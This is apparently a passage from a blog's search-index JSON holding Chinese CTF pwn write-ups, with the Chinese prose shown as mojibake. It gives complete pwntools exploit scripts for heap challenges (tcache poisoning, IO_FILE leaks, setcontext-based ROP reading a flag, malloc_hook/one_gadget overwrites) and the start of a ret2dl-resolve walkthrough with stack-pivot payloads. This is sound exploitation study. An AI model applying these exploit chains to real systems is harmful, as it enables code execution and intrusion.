p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\nprint(len(orw))\n\n#copy the orw to heap+0x2e0\nadd(0,0x10)\nedit(0,orw[0:0x10])\n\nadd(0,0x20)\nedit(0,orw[0x10:0x30])\n\nadd(0,0x30)\nedit(0,orw[0x30:0x60])\n\nadd(0,0x40)\nedit(0,orw[0x60:0xa0])\n\nadd(0,0x50)\nedit(0,orw[0xa0:0xf0])\n\nadd(0,0x60)\nedit(0,orw[0xf0:0x150])\n\nadd(0,0x78)\ndelete(0)\n\np.interactive()\n```\n\n \n\nâ‘¡ä¿®æ”¹sizeï¼š\n\n```\nfrom pwn import *\nimport os\nimport struct\nimport random\nimport time\nimport sys\nimport signal\n\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nlocal = 1\nif local:\np = process('./silverwolf')\nelf = ELF(\"./silverwolf\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nelse:\np = remote(\"114.116.231.128\",\"25285\")\nlibc = ELF(\"./libc-2.27.so\")\n\n\n#ROPgadget\nret = libc_base + 0x00000000000008aa # ret\npop_rdi_ret = libc_base + 0x00000000000215bf# pop rdi ; ret\npop_rsi_ret = libc_base + 0x0000000000023eea # pop rsi ; ret \npop_rdx_rsi_ret = libc_base + 0x0000000000130569 # pop rdx ; pop rsi ; ret\npop_rdx_ret = libc_base + 0x0000000000001b96 # pop rdx ; ret\nsyscall_ret = libc_base + 0x11B637\npop_rax_ret = libc_base + 0x0000000000043ae8\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"Your choice: \"\n\n\ndef add(idx, size):\n    sla(menu, \"1\")\n    sla(\"Index: \",str(idx))\n    sla(\"Size: \",str(size))\n\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"Index: \", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"2\")\n    sla(\"Index: \", str(idx))\n    sla(\"Content: \", str(con))\n\n#leak heap\nadd(0,8)\nadd(0,8)\ndelete(0)\nedit(0,\"A\"*8)\nshow(0)\nru(\"AAAAAAAA\")\nheap = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x10\nprint(\"heap:\",hex(heap))\n\n#control tcache struct,leak libc\nadd(0,0x78)\ndelete(0)\n#edit(0,p64(heap+0x2a0))\nedit(0,p64(heap+0x10))\nadd(0,0x78)\nadd(0,0x78)\nedit(0,\"\\x00\"*35+\"\\x07\")\ndelete(0)\nshow(0)\nru(\"Content: \")\nmalloc_hook = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-112\nfree_hook = malloc_hook+7352\nlibc_base = malloc_hook-0x3EBC30\nsetcontext = libc_base+libc.sym['setcontext']\nsystem = libc_base+0x4F550\nIO_2_1_stdout_addr = libc_base + libc.symbols['_IO_2_1_stdout_']\nenviron = libc_base+libc.symbols['__environ']\nprint(\"IO_stdout:\",hex(IO_2_1_stdout_addr))\nprint(\"environ:\",hex(environ))\nprint(\"libc:\",hex(libc_base))\nprint(\"setcontext:\",hex(setcontext))\nprint(\"system:\",hex(system))\nprint(\"free_hook:\",hex(free_hook))\nprint(\"malloc_hook:\",hex(malloc_hook))\nprint(\"libsystem:\",hex(libc.sym[\"system\"]))\n\n#use IO_FILE,leak environ,elf_base,bss_addr,change size\nedit(0,\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x00\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(0x0)+ #0x20\np64(0x0)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(0x0)+ #0x60\np64(heap+0x10)+ #0x70\np64(IO_2_1_stdout_addr)) #0x80\nadd(0,0x78)\n#delete(0)\n#edit(0,p64(malloc_hook))\n#add(0,0x8)\n#add(0,0x8)\nedit(0,p64(0xFBAD1800)+p64(IO_2_1_stdout_addr+131)*0x3+p64(environ)+p64(environ+0x8))\nstack = u64(p.recv(6)+\"\\x00\"+\"\\x00\")\nprint(\"stack\",hex(stack))\nedit(0,p64(0xFBAD1800) +p64(IO_2_1_stdout_addr+131)*0x3+p64(stack+168)+p64(stack+168+8))\nelf = u64(p.recv(6)+\"\\x00\"+\"\\x00\")-0x40\nprint(\"elf\",hex(elf))\nbss = elf+0x202020\nsize_addr = bss+0x30\n\n#set free_hook to setcontext+53\nadd(0,0x68)\nedit(0,\"\\x01\"+\"\\x01\"+\"\\x00\"+\"\\x00\"+\"\\x01\"+\"\\x02\"+\"\\x04\"+ \"\\x00\"*0x39+\np64(free_hook)+ #0x20\np64(heap+0x260)+ #0x30\np64(0x0)+ #0x40\np64(0x0)+ #0x50\np64(size_addr)) #0x60\nadd(0,0x8)\nedit(0,p64(setcontext+53))\n\n#get final chunk\nadd(0,0x58)\nedit(0,p64(0x500)+p64(heap+0x2e0))\n\n\nfake_rsp = heap+0x2e0+0xb0+0x10\nflag = heap+0x2e0+0xb0\norw = \"a\"*0xa0 + p64(fake_rsp)+p64(ret)\norw += './flag\\x00\\x00'\norw += p64(0)\norw += p64(pop_rdi_ret) + p64(flag)\norw += p64(pop_rsi_ret) + p64(0)\norw += p64(pop_rax_ret) + p64(2)\norw += p64(syscall_ret)\norw += p64(pop_rdi_ret) + p64(3)\norw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\norw += p64(pop_rdx_ret) + p64(0x30)\norw += p64(libc_base+libc.sym['read'])\norw += p64(pop_rdi_ret) + p64(1)\norw += p64(libc_base+libc.sym['write'])\n\nedit(0,orw)\ndelete(0)\n\np.interactive()\n```\n\nâ–²å†™å¾—æœ‰ç‚¹ä¹±ï¼Œä¸ºäº†è¾¾åˆ°æ•ˆæœä¸­é—´åŠ äº†ä¸å°‘ä¸å¿…è¦çš„ï¼Œæ…¢æ…¢æ¥å§ï¼Œåé¢ä¼°è®¡å°±èƒ½æ›´å¥½æ§tcacheäº†ã€‚\n\nä¸‰ã€pwnmyï¼šè¶Šç•Œä»»æ„å†™\n\nè¿™é“é¢˜å¾ˆæœ‰æ„æ€ï¼Œç”¨åˆ°äº†å¾ˆå¤šçŸ¥è¯†ç‚¹ã€‚\n\n1.å…³äºreadå‡½æ•°ï¼šread(fd,&var,amount)\n\nreadå‡½æ•°ä¸­çš„fdå¦‚æœä¸ä¸º0ï¼Œé‚£ä¹ˆå¦‚æœfdå¯¹åº”çš„Filehandleä¸­æ²¡æœ‰æ•°æ®ï¼Œç›¸å½“äºæ²¡æœ‰è¢«æ‰§è¡Œï¼Œå¦‚æœæœ‰æ•°æ®ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ˜¯å¤åˆ¶ï¼Œå°†fdå¯¹åº”Filehandleä¸­çš„æ•°æ®å¤åˆ¶amountä¸ªå­—èŠ‚ç»™varã€‚å…¶å®æœ¬è´¨æ¥è¯´readå°±æ˜¯ä¸€ä¸ªå¤åˆ¶å‡½æ•°ï¼Œåªæ˜¯fdä¸º0ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼Œæ‰€ä»¥ä¼šä»æˆ‘ä»¬çš„è¾“å…¥ä¸­è·å–æ•°æ®æ¥å¤åˆ¶ã€‚æ‰€ä»¥å¾ˆå¤šæ—¶å€™èƒ½å¤Ÿç”¨åˆ°fdæ¥å‡ºé¢˜ã€‚\n\nè¿™é‡Œå°±ç”¨åˆ°é¢˜ç›®çš„writeå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡write(256)è¶Šç•Œï¼Œå°†fdå¯¹åº”çš„Filehandleä¸­çš„éšæœºå€¼å¤åˆ¶ç»™byte_202860ï¼Œæ­¤æ—¶byte_202860ä¸­çš„å€¼ä¸ºresult = open(\"/dev/urandom\", 0);å‡ºæ¥çš„éšæœºå€¼ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448117.png)\n\nä¹‹åå†æ¬¡write(256)è¶Šç•Œï¼Œæ­¤æ—¶byte_202860ä»éšæœºå€¼ä¸­å–ä¸€ä¸ªå­—èŠ‚ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448471.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191448783.png)\n\nè¿™é‡Œå¤ç°æ—¶ä¸º0x15ï¼Œä½†æ˜¯0x15æ²¡æœ‰å¯¹åº”çš„Filehandleï¼Œé‚£ä¹ˆä¾æ®readå‡½æ•°çš„æ€§è´¨ï¼Œç›¸å½“äºæ²¡æœ‰è¿è¡Œï¼Œæ‰€ä»¥byte_202860å°±ä¼šè¢«èµ‹å€¼ä¸º0ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¦write(256)ä¸¤æ¬¡çš„åŸå› ã€‚\n\n2.å…³äºgetshellæ–¹æ³•ï¼š\n\n(1)åˆ©ç”¨scanfå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨æ¥æ”¶è¿‡å¤šè¾“å…¥æ—¶ï¼Œä¼šç”³è¯·å †å—ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥ç”¨mallocå’Œreallocè°ƒæ•´æ ˆå¸§é…åˆone_gadgetæ¥getshellã€‚å› ä¸ºæˆ‘è°ƒè¯•çš„æ—¶å€™æ‰€æœ‰çš„one_gadgetéƒ½ä¸æ»¡è¶³ã€‚\n\n(2)åˆ©ç”¨exitå‡½æ•°ï¼Œå‡½æ•°æµä¸ºï¼š\n\nexit()->__run_exit_handlers->_dl_fini->*******[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]\n\nè€Œ[_dl_rtld_lock_recursive/_dl_rtld_unlock_recursive]ä½äºç»“æ„ä½“_rtld_globalä¸­ï¼Œå¯è¯»å¯å†™ï¼Œæ‰€ä»¥åˆ©ç”¨ä»»æ„å†™æ”¹æ‰_rtld_globalä¸­çš„å‡½æ•°æŒ‡é’ˆä¸ºone_gadgetå³å¯ã€‚ä½†æ˜¯è¿™é‡Œçš„One_gadgetä¹Ÿéƒ½ä¸ç¬¦åˆï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°ä¸€äº›gadgetæ¥è°ƒæ•´ï¼Œè¿™é‡Œè‡ªå·±æ‰¾å§ã€‚\n\næ¨èï¼šhttps://www.cnblogs.com/bhxdn/p/14222558.html\n\n(3)åˆ©ç”¨environï¼Œå¯ä»¥åˆ©ç”¨libcä¸Šçš„environæ¥è·å–æ ˆåœ°å€ï¼Œç„¶åç›´æ¥æ”¹æ ˆä¸Šçš„è¿”å›åœ°å€å—ï¼Œå¯¹åº”è°ƒæ•´æ ˆå¸§å³å¯ã€‚è¿™é‡Œæ”¹writeçš„è¿”å›åœ°å€å¯ä»¥ç›´æ¥getshellã€‚\n\n4.å…³äºæ³„éœ²åœ°å€ï¼š\n\n(1)libcåœ°å€ï¼šå¯ä»¥çœ‹åˆ°bssæ®µä¸Šä¿å­˜ç€ä¸‰ä¸ªæ ‡å‡†ç¬¦å·ï¼š012->stdout,stdin,stderrã€‚è€Œè¿™ä¸‰ä¸ªbssæ®µå˜é‡åœ¨æ‰€æœ‰libcä¸­éƒ½æœ‰ï¼Œå¹¶ä¸”é‡Œé¢ä¿å­˜ç€å¯¹åº”çš„ç»“æ„ä½“çš„åœ°å€ï¼š\n\n_IO_2_1_stdout,_IO_2_1_stdin,_IO_2_1_stderr\n\næ‰€ä»¥å¯ä»¥åˆ©ç”¨ä»»æ„è¯»æ¥è·å–libcåœ°å€ã€‚\n\n(2)elfåœ°å€ï¼šç”±äºä¹‹åéœ€è¦ä¿®æ”¹libcåœ°å€å—ï¼Œæ‰€ä»¥ä¸€å®šéœ€è¦qword_202060çš„åœ°å€ï¼Œè€Œè¿™ä¸ªelfåœ°å€å°±åªèƒ½å¾€åæ‰¾äº†ï¼Œç”¨qword_202060[v2]çš„ç›¸å¯¹åç§»å¾€åæ‰¾äº†ï¼Œè¿™é‡Œè‡ªå·±æ‰¾ã€‚\n\nâ–²ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™é“é¢˜ä¹Ÿå·®ä¸å¤šäº†ï¼Œè€ƒç‚¹è¿˜æ˜¯æŒºå¤šçš„ï¼Œæ–¹æ³•ä¹ŸæŒºå¤šã€‚\n\n```\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwny\"\nlibc_file = \"./libc-2.27.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\n\ndef menu(idx):\n    sla(\": \", str(idx))\n\ndef write_fd(idx):\n    menu(2)\n    sla(\": \", str(idx))\n\n\ndef write(idx, con):\n    menu(2)\n    sla(\": \", str(idx))\n    sd(con)\n\ndef read(idx):\n    menu(1)\n    sa(\": \", idx)\n\nwrite_fd(256)\ngdb.attach(p)\npause()\n\nwrite_fd(256)\n\n#leak stderr\nread(p64(-4&0xffffffffffffffff))\nru(\": \")\nstderr_addr = int(ru(\"\\n\"), 16)\n\n#leak elf\nread(p64(-0xb&0xffffffffffffffff))\nru(\": \")\nelf_base = int(ru(\"\\n\"), 16) -0x202008\n\nlog.info(\"stderr_addr:0x%x\"%stderr_addr)\nlog.info(\"elf_base:0x%x\"%elf_base)\n\nqword_202060_addr = elf_base+0x202060\n\nobj = LibcSearcher(\"_IO_2_1_stderr_\", stderr_addr)\nlibc_base = stderr_addr-obj.dump('_IO_2_1_stderr_')\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\n\nmalloc_hook_addr = libc_base + obj.dump(\"__malloc_hook\")\nrealloc_hook_addr = libc_base + obj.dump(\"__realloc_hook\")\nrealloc_addr = libc_base + obj.dump(\"realloc\")\n_rtld_global_addr = libc_base + obj.dump(\"_rtld_global_\")\n# offset1 = (_rtld_global_addr+3840 - qword_202060_addr)/8\n# offset2 = (_rtld_global_addr+3848 - qword_202060_addr)/8\noffset_malloc = (malloc_hook_addr-qword_202060_addr)/8\noffset_realloc_hook = (realloc_hook_addr-qword_202060_addr)/8\n# log.info(\"offset1:0x%x\"%offset1)\n# log.info(\"offset1:0x%x\"%offset2)\n\nlog.info(\"_rtld_global_addr:0x%x\"%_rtld_global_addr)\nlog.info(\"realloc_addr:0x%x\"%realloc_addr)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nlog.info(\"realloc_hook_addr:0x%x\"%realloc_hook_addr)\n\none_gadget = libc_base + 0x10a41c\nlog.info(\"one_gadget:0x%x\"%one_gadget)\n\n# write(offset1,p64(one_gadget))\n# write(offset2,p64(one_gadget))\nwrite(offset_malloc,p64(realloc_addr+0x4))\nwrite(offset_realloc_hook,p64(one_gadget))\n\n# gdb.attach(p)\n# pause()\n\nsl(\"9\"*0x1000)\np.interactive()\n```\n\n \n\n \n","tags":["æ¯”èµ›"],"categories":["PWN"]},{"title":"XMAN 2016-level3(32+64)","url":"/2021/08/14/XMAN 2016-level3(32+64)/","content":"\n# ä¸€ã€32ä½ç¨‹åº\n\n## 1.æ¼æ´åˆ†æ\n\n- å¸¸è§„checksecï¼Œå¼€äº†Partial RELROå’ŒNXï¼ŒIDAæ‰¾æ¼æ´ï¼Œå¾ˆæ˜æ˜¾åœ¨vulnerable_functionå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [esp+0h] [ebp-88h]\n----------------------------------------------------------------------\nreturn read(0, &buf, 0x100u);\n```\n\n- å¾ˆå¤šç§æ–¹æ³•ï¼Œè¿™é‡Œé€‰æ‹©ç”¨ret2dl-resolveæ¥å°è¯•è§£å†³ã€‚\n\n- å…³äºret2dl-resolveä»‹ç»ï¼Œç¯‡å¹…å¤ªé•¿ï¼Œä¸è¯´äº†ï¼Œåé¢æ”¾èµ„æ–™é“¾æ¥ï¼Œä»‹ç»ä¸€ä¸‹è£…è½½æµç¨‹ï¼š\n  - é€šè¿‡struct link_map *lè·å¾—.dynsymã€.dynstrã€.rel.pltåœ°å€\n  - é€šè¿‡reloc_arg+.rel.pltåœ°å€å–å¾—å‡½æ•°å¯¹åº”çš„Elf32_RelæŒ‡é’ˆï¼Œè®°ä½œreloc\n  - é€šè¿‡reloc->r_infoå’Œ.dynsymåœ°å€å–å¾—å‡½æ•°å¯¹åº”çš„Elf32_SymæŒ‡é’ˆï¼Œè®°ä½œsym\n  - æ£€æŸ¥r_infoæœ€ä½ä½æ˜¯å¦ä¸º7\n  - æ£€æŸ¥(sym->st_other)&0x03æ˜¯å¦ä¸º0\n  - é€šè¿‡strtab+(sym->st_name)è·å¾—å‡½æ•°å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè¿›è¡ŒæŸ¥æ‰¾ï¼Œæ‰¾åˆ°åèµ‹å€¼ç»™rel_addr,æœ€åè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚\n\n## 2.EXPåˆ†æ\n\né¦–å…ˆæ€è€ƒexpç¼–å†™çš„æ”»å‡»æ€è·¯ï¼Œç”±äºæ ˆæº¢å‡ºçš„æ¯”è¾ƒå°‘ï¼Œè€Œret2dl-resolveæ”»å‡»éœ€è¦æ„é€ å‡ ä¸ªç»“æ„ä½“ï¼Œæ‰€å ç©ºé—´è¾ƒå¤§ï¼Œæ‰€ä»¥è¿™é‡Œè¿›è¡Œæ ˆåŠ«æŒï¼Œå°†æ ˆåŠ«æŒåˆ°ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ç”Ÿæˆçš„bssæ®µä¸Šã€‚ä¹‹åå†åœ¨æ ˆä¸Šå¸ƒç½®ç»“æ„ä½“å’Œå¿…è¦æ•°æ®ï¼Œé‡æ–°æ‰§è¡Œå»¶è¿Ÿç»‘å®šï¼ŒåŠ«æŒåŠ¨æ€è£…è½½ï¼Œå°†writeå‡½æ•°è£…è½½æˆsystemå‡½æ•°ï¼Œå¹¶ä¸”åœ¨åŠ«æŒçš„åŒæ—¶å°†Binshå­—ç¬¦ä¸²æ”¾åœ¨æ ˆä¸Šï¼Œè¿™æ ·åŠ«æŒå®Œæˆåå°±ç›´æ¥è°ƒç”¨systemå‡½æ•°ï¼Œå‚æ•°å°±æ˜¯binshã€‚\n\n### (1)å¯»æ‰¾æ•°æ®åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwrite_got = 0x0804a018\nread_plt = 0x08048310\nplt0_addr = 0x08048300\nleave_ret = 0x08048482\npop3_ret = 0x08048519\npop_ebp_ret = 0x0804851b\nnew_stack_addr = 0x0804a500 \n#ç¨‹åºè¿è¡Œèµ·æ¥æ‰ä¼šæœ‰ï¼Œbssä¸gotè¡¨ç›¸é‚»ï¼Œ_dl_fixupä¸­ä¼šé™ä½æ ˆåä¼ å‚ï¼Œè®¾ç½®ç¦»bssé¦–åœ°å€è¿œä¸€ç‚¹é˜²æ­¢å‚æ•°å†™å…¥éæ³•åœ°å€å‡ºé”™\n\nrelplt_addr = 0x080482b0 \n#.rel.pltçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“Elf32_Relåç§»æ„é€ reloc_arg\n\ndynsym_addr = 0x080481cc \n#.dynsymçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„Elf32_Symç»“æ„ä½“åç§»æ¥æ„é€ Elf32_Rel.r_info\n\ndynstr_addr = 0x0804822c \n#.dynstrçš„é¦–åœ°å€ï¼Œé€šè¿‡è®¡ç®—é¦–åœ°å€å’Œæ–°æ ˆä¸Šæˆ‘ä»¬ä¼ªé€ çš„å‡½æ•°åå­—ç¬¦ä¸²systemåç§»æ¥æ„é€ Elf32_Sym.st_name\n```\n\nè¿™é‡Œå¯»æ‰¾çš„relplt_addrï¼Œdynsym_addrï¼Œdynstr_addrä¸€èˆ¬éƒ½æ˜¯ä½äºELFæ–‡ä»¶å¤´éƒ¨çš„LOADæ®µã€‚ç”¨readelf -S binaryä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516027.jpeg)\n\n- relplt_addrï¼š0x080482b0\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516591.jpeg)\n\n- dynsym_addrï¼š0x080481cc\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516336.jpeg)\n\n- dynstr_addrï¼š0x0804822c\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191516123.jpeg)\n\n### (2)æ ˆåŠ«æŒï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"\"\npayload += 'A'*140 #padding\npayload += p32(read_plt) \n#è°ƒç”¨readå‡½æ•°å¾€æ–°æ ˆå†™å€¼ï¼Œé˜²æ­¢leave; retnåˆ°æ–°æ ˆåå‡ºç°retåˆ°åœ°å€0ä¸Šå¯¼è‡´å‡ºé”™\npayload += p32(pop3_ret) \n#readå‡½æ•°è¿”å›åœ°å€ï¼Œä»æ ˆä¸Šå¼¹å‡ºä¸‰ä¸ªå‚æ•°ä»è€Œèƒ½å¤Ÿå°†espæ‹‰åˆ°pop_ebp_retçš„åœ°æ–¹æ¥æ‰§è¡Œ\npayload += p32(0) #fd = 0\npayload += p32(new_stack_addr) #buf = new_stack_addr\npayload += p32(0x400) #size = 0x400\npayload += p32(pop_ebp_ret)\n#æŠŠæ–°æ ˆé¡¶ç»™ebp\npayload += p32(new_stack_addr)\npayload += p32(leave_ret)\n#æ¨¡æ‹Ÿå‡½æ•°è¿”å›ï¼Œåˆ©ç”¨leaveæŒ‡ä»¤æŠŠebpçš„å€¼èµ‹ç»™espï¼Œå®Œæˆæ ˆåŠ«æŒï¼ŒåŒæ—¶ebpæŒ‡å‘ç¬¬äºŒæ®µpayloadçš„ç¬¬ä¸€ä¸ªå†…å®¹ï¼Œeipä¸ºç¬¬äºŒæ®µpayloadä¸­çš„plt0_addr\n\nio.send(payload) #æ­¤æ—¶ç¨‹åºä¼šåœåœ¨ä½¿ç”¨payloadè°ƒç”¨çš„readå‡½æ•°å¤„ç­‰å¾…è¾“å…¥æ•°æ®\n```\n\n### (3)ä¼ªé€ ä¸¤ä¸ªç»“æ„ä½“å’Œå¿…è¦çš„æ•°æ®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nfake_Elf32_Rel_addr = new_stack_addr + 0x50\n#åœ¨æ–°æ ˆä¸Šé€‰æ‹©ä¸€å—ç©ºé—´æ”¾ä¼ªé€ çš„Elf32_Relç»“æ„ä½“ï¼Œç»“æ„ä½“å¤§å°ä¸º8å­—èŠ‚\n\nfake_Elf32_Sym_addr = new_stack_addr + 0x5c \n#åœ¨ä¼ªé€ çš„Elf32_Relç»“æ„ä½“åé¢æ¥ä¸Šä¼ªé€ çš„Elf32_Symç»“æ„ä½“ï¼Œç»“æ„ä½“å¤§å°ä¸º0x10å­—èŠ‚\n\nfake_reloc_arg = fake_Elf32_Rel_addr - relplt_addr \n#è®¡ç®—ä¼ªé€ çš„reloc_arg\n\nfake_st_name_addr = new_stack_addr + 0x6c - dynstr_addr \n#ä¼ªé€ çš„Elf32_Symç»“æ„ä½“åé¢æ¥ä¸Šä¼ªé€ çš„å‡½æ•°åå­—ç¬¦ä¸²system_addr \n\nfake_r_info = ((fake_Elf32_Sym_addr - dynsym_addr)/0x10) << 8 | 0x7 \n#ä¼ªé€ r_infoï¼Œåç§»è¦è®¡ç®—æˆä¸‹æ ‡ï¼Œé™¤ä»¥Elf32_Symçš„å¤§å°ï¼Œæœ€åä¸€å­—èŠ‚ä¸º0x7\n\n\nfake_Elf32_Rel_data = \"\"\nfake_Elf32_Rel_data += p32(write_got) \n#r_offset = write_gotï¼Œä»¥å…é‡å®šä½å®Œæ¯•å›å¡«gotè¡¨çš„æ—¶å€™å‡ºç°éæ³•å†…å­˜è®¿é—®é”™è¯¯\nfake_Elf32_Rel_data += p32(fake_r_info)\n\nfake_Elf32_Sym_data = \"\"\nfake_Elf32_Sym_data += p32(fake_st_name_addr)\nfake_Elf32_Sym_data += p32(0) \n#åé¢çš„æ•°æ®ç›´æ¥å¥—ç”¨writeå‡½æ•°çš„Elf32_Symç»“æ„ä½“\nfake_Elf32_Sym_data += p32(0)\nfake_Elf32_Sym_data += p8(0x12)\nfake_Elf32_Sym_data += p8(0)\nfake_Elf32_Sym_data += p16(0)\n\nbinsh_addr = new_stack_addr + 0x74 #æŠŠ/bin/sh\\x00å­—ç¬¦ä¸²æ”¾åœ¨æœ€åé¢\n```\n\n- reloc_argä½œç”¨ï¼šä½œä¸ºåç§»å€¼ï¼Œä¸relplt_addrç›¸åŠ å¾—åˆ°ELF32_Relç»“æ„ä½“çš„åœ°å€ã€‚è¿™é‡Œè®¾ç½®æˆfake_reloc_arg = fake_Elf32_Rel_addr - relplt_addrï¼Œé‚£ä¹ˆç›¸åŠ ä¹‹åå°±å¯ä»¥ç›´è¾¾æˆ‘ä»¬è®¾ç½®çš„fake_ELF32_Relç»“æ„ä½“ä½ç½®ã€‚\n\n- st_name_addrä½œç”¨ï¼šä½œä¸ºåç§»å€¼ï¼Œä¸dynstr_addrç›¸åŠ å¾—åˆ°å­˜æ”¾å‡½æ•°åçš„åœ°å€ã€‚å¦‚æœæŒ‰ç…§åŸæœ¬çš„é‡å®šä½ï¼Œé‚£ä¹ˆæ­¤å¤„è®¡ç®—ä¹‹åå­˜æ”¾çš„åº”è¯¥æ˜¯writeï¼Œæ‰€ä»¥è¿™é‡Œå°†å…¶æ”¹ä¸ºsystemï¼Œæ”¾åœ¨æ‰€æœ‰æ•°æ®çš„æœ€åé¢ï¼Œå°†åœ°å€å­˜æ”¾åˆ°fake_Elf32_Symç»“æ„ä½“ä¸­ï¼Œè®¾ç½®ä¸ºfake_st_name_addr = new_stack_addr + 0x6c - dynstr_addrï¼Œè¿™æ ·ç›¸åŠ ä¹‹åå°±ä¼šå®šä½åˆ°new_stack_addr + 0x6cï¼Œå³æˆ‘ä»¬åŠ«æŒæ ˆä¸Šçš„systemå­—ç¬¦ä¸²åœ°å€å¤„ï¼Œä»è€ŒåŠ«æŒè£…è½½ã€‚\n\n- r_infoä½œç”¨ï¼šä½œä¸ºåç§»å€¼ï¼Œä½¿å¾—ç»“æ„ä½“æ•°ç»„Elf32_Sym[r_info>>8]æ¥æ‰¾åˆ°å­˜æ”¾writeçš„ç»“æ„ä½“Elf32_Symã€‚æˆ‘ä»¬çŸ¥é“ç»“æ„ä½“æ•°ç»„å¯»å€æ–¹å¼å…¶å®å°±æ˜¯addr = head_addr + size*indxï¼Œä¹Ÿå°±æ˜¯é¦–åœ°å€åŠ ä¸Šæ•°ç»„ä¸­å…ƒç´ å¤§å°ä¹˜ä»¥ç´¢å¼•ã€‚è¿™é‡Œç”±äºä¼ªé€ äº†Elf32_Symç»“æ„ä½“ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„r_info>>8 = indxåº”è¯¥æ˜¯addr - head_addr/sizeï¼Œå¯¹åº”çš„å°±æ˜¯(fake_Elf32_Sym_addr - dynsym_addr)/0x10ï¼Œå¾—åˆ°æœ€ç»ˆçš„r_infoä¸º((fake_Elf32_Sym_addr - dynsym_addr)/0x10)<<8ã€‚\n\n- 